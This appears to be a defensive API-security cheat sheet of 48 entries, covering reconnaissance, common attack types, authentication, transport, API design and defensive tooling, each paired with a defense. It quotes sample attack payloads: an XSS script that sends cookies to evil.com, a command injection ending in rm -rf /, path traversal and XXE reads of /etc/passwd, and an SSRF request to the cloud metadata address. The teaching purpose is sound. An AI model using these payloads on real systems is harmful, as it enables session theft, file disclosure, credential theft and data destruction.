🕵️ Step 1: Recon & Exposure — How Attackers Discover Your Surface

1. Endpoint Enumeration
Discovery

Using wordlists with tools like gobuster or scraping frontend bundle source maps (bundle.js) for /api/ strings to find hidden routes.

Defense: Never rely on security by obscurity. Assume all unlisted endpoints will be found.
2. Exposed API Docs
Blueprint Leak

Leaving Swagger UI or OpenAPI specs (/api-docs, /swagger.json) publicly accessible in production environments.

Defense: Require authentication on documentation endpoints or remove them in production builds.
3. Information Disclosure
Stack Traces

Returning raw database SQL errors, environment variables, or server directory file paths in HTTP 500 error responses.

Defense: Catch internal exceptions and return generic sanitized error messages to clients.
4. Google Dorking / OSINT
Search Index

Attackers querying Google indexes using search operators like site:company.com inurl:/api/ or intitle:"index of /secrets".

Defense: Configure strict robots.txt and never expose directory index listings.
5. Secrets in Git
Repo Leaks

Accidentally committing raw AWS IAM keys, Stripe tokens, or private RSA keys into Git history. Scanned by tools like truffleHog.

Defense: Enforce `.gitignore` pre-commit hooks (git-secrets) and rotate leaked credentials instantly.
6. Subdomain Takeover
Dangling DNS

DNS CNAME records pointing to deleted cloud services (e.g., old Heroku apps or S3 buckets). Attackers claim the service and hijack traffic.

Defense: Periodically audit DNS zone records and remove stale CNAME entries immediately upon service deletion.
7. Supply Chain Attacks
Dependencies

Typosquatting or compromising upstream package managers (npm, PyPI) to inject malicious pre-install scripts into your node_modules.

Defense: Lock package hashes using `package-lock.json` and run automated dependency vulnerability audits (`npm audit`).
8. Cloud Misconfiguration
Storage Leaks

Leaving AWS S3 buckets, Google Cloud Storage, or MongoDB databases publicly readable without authentication policies.

Defense: Enforce cloud organization policies blocking public bucket access (AWS Block Public Access).

💥 Step 2: Attack Types — The 12 Exploits That Break Your API

9. IDOR / BOLA
Critical #1

Changing URL identifiers (/api/orders/1001 ➔ 1002) to view objects belonging to other users without authorization checks.

Defense: Always scope SQL query to verified JWT user ID: WHERE id=? AND user_id=req.user.id
10. SQL Injection (SQLi)
Injection

Concatenating untrusted input into database query strings (' OR '1'='1), allowing attackers to dump or drop tables.

Defense: Strictly use Parameterized Queries ($1 / Prepared Statements).
11. XSS (Cross-Site Scripting)
Browser

Injecting JavaScript tags (<script>fetch('evil.com?c='+document.cookie)</script>) into HTML DOM to steal session tokens.

Defense: Context-aware HTML entity escaping + Content Security Policy (CSP).
12. CSRF (Request Forgery)
Browser

Malicious third-party website auto-attaches victim's authenticated cookies to forge state mutations on banking/API servers.

Defense: Set cookies to SameSite=Strict/Lax + Anti-CSRF Synchronizer Tokens.
13. Mass Assignment
Over-Posting

Passing req.body directly to database update ORMs allows attackers to inject extra attributes like {"role": "admin"}.

Defense: Explicitly whitelist allowed fields via DTOs (const {name} = req.body).
14. Path Traversal
Filesystem

Manipulating file download endpoints (../../../../etc/passwd) to read arbitrary operating system files.

Defense: Strip traversal sequences (../) and validate against absolute base directory paths.
15. SSRF (Server-Side Forgery)
Cloud Threat

Supplying webhook URLs targeting internal cloud metadata IP addresses (http://169.254.169.254/latest/meta-data/) to steal cloud IAM roles.

Defense: Block internal network IP ranges (10.0.0.0/8, 127.0.0.1) in URL input validators.
16. XXE (XML External Entity)
XML Parser

Uploading malicious XML containing external system entities (<!ENTITY x SYSTEM "file:///etc/passwd">) forcing parsers to leak files.

Defense: Completely disable DTD (Document Type Definition) processing in XML parsers.
17. Command Injection
RCE Shell

Passing untrusted input directly to OS system shell commands (exec("ping " + ip)). Attacker inputs 127.0.0.1; rm -rf /.

Defense: Never execute shell interpreters. Pass command arguments as separate array elements.
18. Man-in-the-Middle (MITM)
Network

Intercepting unencrypted network packets on Wi-Fi routers to steal HTTP Authorization headers and plaintext tokens.

Defense: Enforce HTTP Strict Transport Security (HSTS) and mandatory TLS 1.3 across all routes.
19. Replay Attack
Network

Intercepting a valid signed API request and resending it multiple times to execute duplicate financial transfers.

Defense: Include unique request nonces and expiration timestamps verified in idempotency stores.
20. DoS / DDoS
Availability

Flooding API endpoints with millions of requests per second to exhaust database connection pools or CPU memory.

Defense: Implement Token Bucket rate limiters and deploy Web Application Firewalls (WAF).

🔐 Step 3: Auth & Identity — Who Are You & What Can You Do

21. JWT Internals
Tokens

Self-contained stateless cryptographic tokens (`header.payload.sig`). Avoid `jwt.decode()` trap; always enforce cryptographic signature checks.

Defense: Always use `jwt.verify(token, secret)` and store tokens in HttpOnly cookies.
22. OAuth 2.0 & OIDC Flows
Delegation

Authorization Code Flow with PKCE (`code_verifier` + `code_challenge`) protects single-page apps from authorization code interception.

Defense: Enforce PKCE on all public client applications.
23. RBAC vs ABAC
Access Models

RBAC: Role-Based (Admin vs User). ABAC: Attribute-Based (Can edit order ONLY IF `order.department == user.department`).

Defense: Combine RBAC for route access with ABAC for granular object security.
24. Session Management
Sessions

Preventing session fixation and hijacking by regenerating session IDs immediately upon authentication and enforcing idle timeouts.

Defense: Use cryptographically secure random session IDs stored in HttpOnly cookies.
25. Broken Access Control
OWASP #1

Missing server-side permission checks allowing regular users to execute administrative mutations (`DELETE /api/admin/users/1`).

Defense: Enforce mandatory authorization middleware on every protected endpoint.
26. MFA / 2FA
Multi-Factor

Requiring two distinct factors: password + TOTP authenticator app or hardware WebAuthn security key.

Defense: Prefer FIDO2/WebAuthn passkeys over SMS 2FA to eliminate SIM swap attacks.
27. API Key Management
B2B Auth

Securing machine-to-machine integrations. Never expose raw API keys in client-side code or public Git repositories.

Defense: Store hashed keys in database (SHA-256), enforce IP scoping, and rotate regularly.
28. Password Hashing
Cryptography

One-way cryptographic key derivation functions intentionally consuming memory/CPU to prevent GPU brute-force attacks.

Defense: Use `Argon2id` or `bcrypt` with unique per-user random salts.

🌐 Step 4: Transport & Network — Securing Data in Motion

29. TLS 1.3 Handshake
Encryption

The modern standard for HTTPS encryption. Eliminates obsolete ciphers and achieves secure connection handshakes in 1 round trip.

Defense: Enforce modern cipher suites and redirect all HTTP traffic to HTTPS.
30. CORS Preflight & Rules
Origin Shield

Cross-Origin Resource Sharing uses browser preflight `OPTIONS` requests. Never combine wildcard `Origin: *` with credentials enabled.

Defense: Explicitly whitelist trusted frontend domains in CORS headers.
31. Security Headers
HTTP Armor

Essential response headers protecting browsers: `Content-Security-Policy (CSP)`, `HSTS`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`.

Defense: Configure middleware (helmet.js) to inject security headers on every response.
32. Certificate Pinning
Mobile Security

Embedding the exact public key hash of your server certificate inside iOS/Android apps to prevent root-CA interception.

Defense: Pin backup public keys alongside primary certs to prevent app lockouts during renewals.

🛠️ Step 5: API Design Security — Building It Safe From The Start

33. Rate Limiting Algorithms
Resilience

Throttling endpoints using Token Bucket and Sliding Window counters to prevent brute-force attacks and AI token budget drain.

Standard: Return HTTP 429 Too Many Requests with `Retry-After` headers.
34. Strict Input Validation
Schema Defense

Validating incoming request bodies, params, and headers against strict runtime schema allowlists (Zod / Pydantic).

Standard: Reject unknown properties and enforce strict data type and length constraints.
35. API Versioning & Sunsetting
Lifecycle

Preventing breaking changes by versioning endpoints (`/api/v1/` vs `/api/v2/`) and communicating deprecation timelines.

Standard: Include RFC 8594 `Sunset` HTTP response headers on deprecated routes.
36. Safe Error Handling
Sanitization

Preventing information leaks by never returning stack traces, SQL errors, or internal file paths in production HTTP responses.

Standard: Log detailed errors internally with Correlation IDs; return sanitized messages to clients.
37. Idempotency Keys
Retry Safety

Preventing duplicate financial transactions during network retries by requiring clients to send unique `X-Idempotency-Key` headers.

Standard: Cache request execution results in Redis setnx for 24 hours.
38. GraphQL Security
Query Defense

Preventing denial of service from deeply nested GraphQL queries (`author { books { author { books } } }`) or public introspection.

Standard: Disable introspection in production and enforce query depth limits (max depth 5).
39. Webhook Security
Event Integrity

Verifying that incoming asynchronous webhook events actually originated from trusted vendors (Stripe/GitHub) rather than attackers.

Standard: Verify cryptographic HMAC signatures (`X-Stripe-Signature`) using secret webhook keys.
40. Least Privilege Architecture
Zero Trust

Granting microservices, database users, and API tokens only the minimum exact permissions required to perform their function.

Standard: Never run microservices or database connections using root or superuser credentials.

🛡️ Step 6: Defensive Tools & Practices — Building The Enterprise Shield

41. WAF (Web Application Firewall)
Perimeter Shield

Deploying edge firewalls (Cloudflare, AWS WAF) that filter SQL injection payloads, XSS strings, and DDoS bursts before traffic hits origin servers.

Practice: Enable OWASP Core Rule Set (CRS) and bot management on perimeter proxies.
42. Penetration Testing
Security Auditing

Simulating real hacker attacks using interception proxies (Burp Suite, OWASP ZAP) to identify API vulnerabilities before release.

Practice: Conduct automated security scanning in CI/CD pipelines alongside annual third-party pen tests.
43. Secrets Management
Vaulting

Storing API keys, database credentials, and TLS certificates inside secure hardware vaults (HashiCorp Vault, AWS Secrets Manager).

Practice: Inject secrets into containers as dynamic runtime memory variables rather than static files.
44. Security Logging & SIEM
Anomaly Detection

Forwarding structured JSON logs to Security Information and Event Management (SIEM) systems (Datadog, Splunk) to detect intrusion anomalies.

Practice: Alert SOC teams instantly on spikes in HTTP 401/403 errors or SQL syntax anomalies.
45. OWASP API Top 10
Industry Standard

The industry benchmark checklist summarizing the 10 most critical API security risks (BOLA, Broken Auth, Mass Assignment, etc.).

Practice: Require all full-stack engineers to review the OWASP API Top 10 during onboarding.
46. Threat Modelling (STRIDE)
Design Auditing

Evaluating architectures using the STRIDE framework: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation of privilege.

Practice: Perform STRIDE threat modeling workshops before writing code for new features.
47. Security Code Review
Pull Requests

Auditing Pull Requests specifically for security regressions: missing auth middleware, raw string queries, or unvalidated user inputs.

Practice: Use automated SAST (Static Application Security Testing) tools like SonarQube or Semgrep in PR checks.
48. Incident Response
Containment

Having a documented operational runbook defining exactly who to call, how to isolate compromised servers, and how to revoke breached tokens during an attack.

Practice: Conduct quarterly breach tabletop simulations to verify incident escalation procedures.
